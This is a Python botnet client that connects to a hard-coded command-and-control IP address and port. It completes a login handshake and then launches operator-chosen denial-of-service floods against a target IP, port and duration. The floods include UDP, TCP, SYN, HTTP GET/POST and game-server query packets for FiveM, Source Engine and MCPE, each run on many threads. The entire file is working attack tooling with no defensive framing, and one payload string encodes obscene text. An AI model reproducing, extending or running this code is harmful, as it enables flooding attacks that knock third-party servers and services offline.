import socket
import threading
import time
import random
import os

# Configuration
C2_ADDRESS  = "134.255.234.140"
C2_PORT     = 6666

# Payloads (example, replace with actual payloads)
payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
payload_vse = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
payload_hex = b'\x55\x55\x55\x55\x00\x00\x00\x01'

PACKET_SIZES = [512, 1024, 2048]

# Function to generate random user agent
def rand_ua():
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'

# Bot functions
def attack_fivem(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        s.sendto(payload_fivem, (ip, port))

def attack_mcpe(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        s.sendto(payload_mcpe, (ip, port))

def attack_vse(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        s.sendto(payload_vse, (ip, port))

def attack_hex(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        s.sendto(payload_hex, (ip, port))

def attack_udp_bypass(ip, port, secs):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        packet_size = random.choice(PACKET_SIZES)
        packet = random._urandom(packet_size)
        sock.sendto(packet, (ip, port))

def attack_tcp_bypass(ip, port, secs):
    while time.time() < secs:
        packet_size = random.choice(PACKET_SIZES)
        packet = random._urandom(packet_size)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            while time.time() < secs:
                s.send(packet)
        except Exception as e:
            pass
        finally:
            s.close()

def attack_syn(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)
    try:
        s.connect((ip, port))
        while time.time() < secs:
            packet_size = random.choice(PACKET_SIZES)
            packet = os.urandom(packet_size)
            s.send(packet)
    except Exception as e:
        pass

def attack_http_get(ip, port, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except:
            s.close()

def attack_http_post(ip, port, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                payload = '757365726e616d653d61646d696e2670617373776f72643d70617373776f726431323326656d61696c3d61646d696e406578616d706c652e636f6d267375626d69743d6c6f67696e'
                headers = (f'POST / HTTP/1.1\r\n'
                           f'Host: {ip}\r\n'
                           f'User-Agent: {rand_ua()}\r\n'
                           f'Content-Type: application/x-www-form-urlencoded\r\n'
                           f'Content-Length: {len(payload)}\r\n'
                           f'Connection: keep-alive\r\n\r\n'
                           f'{payload}')
                s.send(headers.encode())
        except:
            s.close()

# Method Selector
def lunch_attack(method, ip, port, secs):
    methods = {
        '.HEX': attack_hex,
        '.UDP': attack_udp_bypass,
        '.TCP': attack_tcp_bypass,
        '.SYN': attack_syn,
        '.VSE': attack_vse,
        '.MCPE': attack_mcpe,
        '.FIVEM': attack_fivem,
        '.HTTPGET': attack_http_get,
        '.HTTPPOST': attack_http_post,
    }
    methods[method](ip, port, secs)

# Bot Connection and Command Processing
def run_bot():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    c2.setblocking(False)

    while 1:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))

            while 1:
                data = c2.recv(1024).decode()
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    break

            while 1:
                data = c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break

            print('connected!')
            break
        except:
            time.sleep(120)

    while 1:
        try:
            data = c2.recv(1024).decode().strip()
            if not data:
                break

            args = data.split(' ')
            command = args[0].upper()

            if command == 'PING':
                c2.send('PONG'.encode())
            else:
                method = command
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=lunch_attack, args=(method, ip, port, secs), daemon=True).start()
        except:
            break

    c2.close()

# Function to start multiple bots
def start_multiple_bots(num_bots):
    threads = []
    for i in range(num_bots):
        bot_thread = threading.Thread(target=run_bot)
        threads.append(bot_thread)
        bot_thread.start()

    # Wait for all bot threads to finish (if needed)
    for bot_thread in threads:
        bot_thread.join()

# Run multiple bots
if __name__ == "__main__":
    num_bots = 10  # Set the number of bots you want to run

    start_multiple_bots(num_bots)
